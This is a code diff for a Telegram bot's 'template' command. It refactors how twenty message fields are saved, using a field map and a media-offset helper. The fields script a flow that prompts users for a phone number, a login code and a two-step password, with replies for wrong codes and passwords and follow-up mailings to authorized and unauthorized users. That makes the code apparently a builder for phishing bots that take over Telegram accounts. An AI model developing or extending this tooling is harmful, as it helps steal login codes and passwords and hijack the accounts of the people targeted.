@@ -20,9 +20,11 @@ const reply_markup = {
 export default {
     name: "template",
     async exec(message, args) {
+       
         if (!message.text) return;
         if (!args[0]) {
             states.set(message.from.id, { action: "template", args: [...args, message.text] })
+
             return await bot.sendMessage(message.from.id, `*Введите сообщение после /start*`, {
                 parse_mode: 'Markdown',
                 reply_markup
@@ -53,18 +55,18 @@ export default {
                         action: "template",
                         args: [...args, message.text, relativePath]
                     });
-                    args.push(message.text, relativePath);
+                  
                 } catch (error) {
                     console.error('Ошибка при сохранении файла:', error);
                     states.set(message.from.id, {
                         action: "template",
                         args: [...args, message.text]
                     });
-                    args.push(message.text);
+                   
                 }
             } else {
                 states.set(message.from.id, { action: "template", args: [...args, message.text] })
-                args.push(message.text)
+              
             }
             return await bot.sendMessage(message.from.id, `*Введите сообщение после ввода номера*
 
@@ -73,7 +75,7 @@ _❔ Пример: Введите k0d_`, {
                 reply_markup
             });
         }
-        if (!args[2]) {
+        if (!args[2] ) {
             states.set(message.from.id, { action: "template", args: [...args, message.text] })
             return await bot.sendMessage(message.from.id, `*Введите сообщение после авторизации*`, {
                 parse_mode: 'Markdown',
@@ -318,33 +320,68 @@ _❔ Пример: Ожидайте..._`, {
                 reply_markup
             });
         }
-        const [name, start, media_startbot, code, auth, password, wrongPassword, wrongCode, NaNCode, timeout, error, wait, mailing1h, button, type, url, mailing1hUnauth, buttonUnauth, typeUnauth, urlUnauth] = args;
+
+        const TEMPLATE_STRUCTURE = {
+            0: { name: 'name', description: 'Название шаблона' },
+            1: { name: 'start', description: 'Сообщение после /start' },
+            2: { name: 'media_startbot', description: 'Медиафайл' },
+            3: { name: 'code', description: 'Сообщение после ввода номера' },
+            4: { name: 'auth', description: 'Сообщение после авторизации' },
+            5: { name: 'password', description: 'Сообщение если стоит пароль' },
+            6: { name: 'wrongPassword', description: 'Сообщение при неверном пароле' },
+            7: { name: 'wrongCode', description: 'Сообщение при неверном коде' },
+            8: { name: 'NaNCode', description: 'Сообщение если код не цифры' },
+            9: { name: 'timeout', description: 'Сообщение при таймауте' },
+            10: { name: 'error', description: 'Сообщение при ошибке' },
+            11: { name: 'wait', description: 'Сообщение ожидания' },
+            12: { name: 'mailing1h', description: 'Текст рассылки (авторизован)' },
+            13: { name: 'button', description: 'Текст кнопки (авторизован)' },
+            14: { name: 'type', description: 'Тип кнопки (авторизован)' },
+            15: { name: 'url', description: 'URL кнопки (авторизован)' },
+            16: { name: 'mailing1hUnauth', description: 'Текст рассылки (не авторизован)' },
+            17: { name: 'buttonUnauth', description: 'Текст кнопки (не авторизован)' },
+            18: { name: 'typeUnauth', description: 'Тип кнопки (не авторизован)' },
+            19: { name: 'urlUnauth', description: 'URL кнопки (не авторизован)' }
+        };
+
+        const createParams = (args, hasMedia = false) => {
+            const params = {};
+            let mediaOffset = 0;
+
+            Object.entries(TEMPLATE_STRUCTURE).forEach(([index, field]) => {
+                const i = parseInt(index);
+                
+                if (field.name === 'media_startbot') {
+                    params[field.name] = hasMedia ? args[i] : null;
+                    mediaOffset = hasMedia ? 0 : -1;
+                } else {
+                    params[field.name] = args[i + mediaOffset];
+                }
+            });
+
+            return params;
+        };
+        const hasMedia = args[1]?.includes('uploads');
+        
+        const params = createParams(args, hasMedia);
+
         await new template({
             id: Date.now(),
             owner: message.from.id,
-            name,
-            start,
-            media_startbot,
-            code,
-            auth,
-            password,
-            wrongPassword,
-            wrongCode,
-            NaNCode,
-            timeout,
-            error,
-            wait,
-            mailing1h,
-            button,
-            type,
-            url,
-            mailing1hUnauth,
-            buttonUnauth,
-            typeUnauth,
-            urlUnauth,
+            ...params,
             contact: message.raw
         }).save();
-        console.log([name, start, media_startbot, code, auth, password, wrongPassword, wrongCode, NaNCode, timeout, error, wait, mailing1h, button, type, url, mailing1hUnauth, buttonUnauth, typeUnauth, urlUnauth])
+
+        // Для отладки
+        console.log('Template structure:', {
+            hasMedia,
+            argsLength: args.length,
+            params: Object.entries(params).map(([key, value]) => ({
+                field: key,
+                value: value,
+                description: Object.values(TEMPLATE_STRUCTURE).find(f => f.name === key)?.description
+            }))
+        });
 
         states.delete(message.from.id);
         return await bot.sendMessage(message.from.id, `*✅ Шаблон успешно создан!*`, {
